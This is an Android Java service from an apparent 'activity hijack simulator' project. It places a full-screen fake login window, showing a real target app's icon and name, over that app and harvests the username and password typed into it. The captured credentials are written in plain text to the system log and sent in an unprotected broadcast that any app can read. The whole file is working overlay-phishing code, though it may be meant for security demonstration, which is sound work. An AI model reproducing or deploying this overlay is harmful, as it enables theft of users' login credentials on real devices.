package com.activityhijack.simulator.services;

import android.app.Service;
import android.content.Intent;
import android.graphics.PixelFormat;
import android.os.Build;
import android.os.IBinder;
import android.provider.Settings;
import android.util.Log;
import android.view.Gravity;
import android.view.LayoutInflater;
import android.view.View;
import android.view.WindowManager;
import android.widget.Button;
import android.widget.EditText;
import android.widget.ImageView;
import android.widget.TextView;
import android.widget.Toast;

import androidx.annotation.Nullable;

import com.activityhijack.simulator.R;
import com.activityhijack.simulator.models.AppInfo;
import com.activityhijack.simulator.utils.AppManager;

/**
 * 覆盖界面服务
 * 负责显示模拟登录框覆盖在目标应用上
 */
public class OverlayService extends Service {
    private static final String TAG = "OverlayService";

    private WindowManager windowManager;
    private View overlayView;
    private WindowManager.LayoutParams layoutParams;
    private String targetPackageName;

    @Override
    public void onCreate() {
        super.onCreate();
        windowManager = (WindowManager) getSystemService(WINDOW_SERVICE);
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        if (intent != null) {
            targetPackageName = intent.getStringExtra("target_package");
            if (targetPackageName != null) {
                showOverlay();
            }
        }
        return START_NOT_STICKY;
    }

    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        removeOverlay();
    }

    /**
     * 显示覆盖界面
     */
    private void showOverlay() {
        // 检查悬浮窗权限
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && !Settings.canDrawOverlays(this)) {
            Log.e(TAG, "没有悬浮窗权限");
            stopSelf();
            return;
        }

        // 移除已存在的覆盖界面
        removeOverlay();

        // 创建覆盖界面
        overlayView = LayoutInflater.from(this).inflate(R.layout.overlay_login, null);

        // 设置目标应用信息
        setupTargetAppInfo();

        // 设置登录按钮点击事件
        setupLoginButton();

        // 配置窗口参数
        layoutParams = new WindowManager.LayoutParams(
            WindowManager.LayoutParams.MATCH_PARENT,
            WindowManager.LayoutParams.MATCH_PARENT,
            getWindowType(),
            WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE |
                WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN |
                WindowManager.LayoutParams.FLAG_FULLSCREEN,
            PixelFormat.TRANSLUCENT
        );
        layoutParams.gravity = Gravity.CENTER;

        // 添加覆盖界面到窗口
        try {
            windowManager.addView(overlayView, layoutParams);
            Log.d(TAG, "覆盖界面已显示");
        } catch (Exception e) {
            Log.e(TAG, "显示覆盖界面失败: " + e.getMessage());
        }
    }

    /**
     * 获取窗口类型
     * @return 窗口类型常量
     */
    private int getWindowType() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            return WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY;
        } else {
            return WindowManager.LayoutParams.TYPE_PHONE;
        }
    }

    /**
     * 设置目标应用信息
     */
    private void setupTargetAppInfo() {
        if (overlayView == null || targetPackageName == null) return;

        ImageView ivAppIcon = overlayView.findViewById(R.id.iv_app_icon);
        TextView tvAppName = overlayView.findViewById(R.id.tv_app_name);

        AppManager appManager = new AppManager(this);
        AppInfo appInfo = appManager.getAppByPackageName(targetPackageName);

        if (appInfo != null) {
            ivAppIcon.setImageDrawable(appInfo.getAppIcon());
            tvAppName.setText(appInfo.getAppName() + " - 用户登录");
        } else {
            tvAppName.setText("用户登录");
        }
    }

    /**
     * 设置登录按钮点击事件
     */
    private void setupLoginButton() {
        if (overlayView == null) return;

        EditText etUsername = overlayView.findViewById(R.id.et_username);
        EditText etPassword = overlayView.findViewById(R.id.et_password);
        Button btnLogin = overlayView.findViewById(R.id.btn_login);

        btnLogin.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                String username = etUsername.getText().toString().trim();
                String password = etPassword.getText().toString().trim();

                if (username.isEmpty() || password.isEmpty()) {
                    Toast.makeText(OverlayService.this, "请输入用户名和密码", Toast.LENGTH_SHORT).show();
                    return;
                }

                // 捕获登录信息
                onLoginInfoCaptured(username, password);
            }
        });
    }

    /**
     * 登录信息捕获回调
     * @param username 用户名
     * @param password 密码
     */
    private void onLoginInfoCaptured(String username, String password) {
        Log.d(TAG, "捕获到登录信息 - 用户名: " + username + ", 密码: " + password);

        // 发送广播通知主界面
        Intent broadcastIntent = new Intent("com.activityhijack.LOGIN_CAPTURED");
        broadcastIntent.putExtra("target_package", targetPackageName);
        broadcastIntent.putExtra("username", username);
        broadcastIntent.putExtra("password", password);
        sendBroadcast(broadcastIntent);

        // 显示提示
        Toast.makeText(this, "登录信息已捕获", Toast.LENGTH_SHORT).show();

        // 延迟移除覆盖界面
        overlayView.postDelayed(new Runnable() {
            @Override
            public void run() {
                removeOverlay();
                stopSelf();
            }
        }, 2000);
    }

    /**
     * 移除覆盖界面
     */
    private void removeOverlay() {
        if (overlayView != null && windowManager != null) {
            try {
                windowManager.removeView(overlayView);
                overlayView = null;
                Log.d(TAG, "覆盖界面已移除");
            } catch (Exception e) {
                Log.e(TAG, "移除覆盖界面失败: " + e.getMessage());
            }
        }
    }
}